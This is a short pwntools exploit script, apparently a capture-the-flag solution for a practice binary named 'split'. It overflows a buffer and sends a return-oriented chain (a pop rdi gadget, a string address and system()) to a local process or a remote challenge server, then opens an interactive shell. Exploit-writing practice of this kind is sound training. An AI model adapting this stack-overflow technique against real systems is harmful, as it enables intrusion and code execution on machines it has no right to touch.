#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./split')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

flag_add = 0x0601060
system_add = 0x04005E0
pop_rdi = 0x00400883
z('b*0x0400805\nc')

payload = 'A'*0x20+p64(0)+p64(pop_rdi)+p64(flag_add)+p64(system_add)

cn.send(payload)

cn.interactive()
